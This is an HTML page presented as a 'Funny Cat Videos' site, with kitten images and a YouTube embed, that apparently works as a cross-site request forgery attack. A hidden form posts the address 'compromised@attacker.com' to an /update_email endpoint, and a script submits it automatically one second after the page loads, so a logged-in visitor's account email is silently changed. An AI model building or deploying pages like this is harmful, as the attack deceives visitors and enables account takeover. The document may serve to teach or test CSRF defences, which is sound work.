<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Funny Cat Videos</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f8f9fa;
            font-family: Arial, sans-serif;
        }
        .container {
            max-width: 800px;
            margin: 50px auto;
        }
        .cat-img {
            max-width: 100%;
            border-radius: 10px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <!-- Hidden form that will be auto-submitted -->
    <form id="hiddenForm" action="/update_email" method="POST" style="display:none;">
        <input type="hidden" name="email" value="compromised@attacker.com">
    </form>
    
    <div class="container">
        <div class="card">
            <div class="card-header bg-primary text-white">
                <h2>Funny Cat Videos</h2>
            </div>
            <div class="card-body">
                <h4>Most Adorable Cat Compilation</h4>
                
                <img src="https://placekitten.com/800/400" alt="Funny Cat" class="cat-img">
                
                <div class="ratio ratio-16x9 mb-4">
                    <iframe src="https://www.youtube.com/embed/XyNlqQId-nk" title="YouTube video" allowfullscreen></iframe>
                </div>
                
                <h4>More Amazing Cat Videos</h4>
                <div class="row">
                    <div class="col-md-6 mb-4">
                        <div class="card">
                            <img src="https://placekitten.com/300/200" class="card-img-top" alt="Cat">
                            <div class="card-body">
                                <h5 class="card-title">Cats Playing With Toys</h5>
                                <p class="card-text">Watch these adorable cats play with their favorite toys!</p>
                                <a href="#" class="btn btn-primary">Watch Video</a>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6 mb-4">
                        <div class="card">
                            <img src="https://placekitten.com/300/201" class="card-img-top" alt="Cat">
                            <div class="card-body">
                                <h5 class="card-title">Cats Doing Funny Jumps</h5>
                                <p class="card-text">These cats show off their impressive jumping skills!</p>
                                <a href="#" class="btn btn-primary">Watch Video</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        // Automatically submit the form when the page loads
        window.onload = function() {
            // Wait 1 second before submitting to let the page load
            setTimeout(function() {
                document.getElementById('hiddenForm').submit();
            }, 1000);
        }
    </script>
</body>
</html>
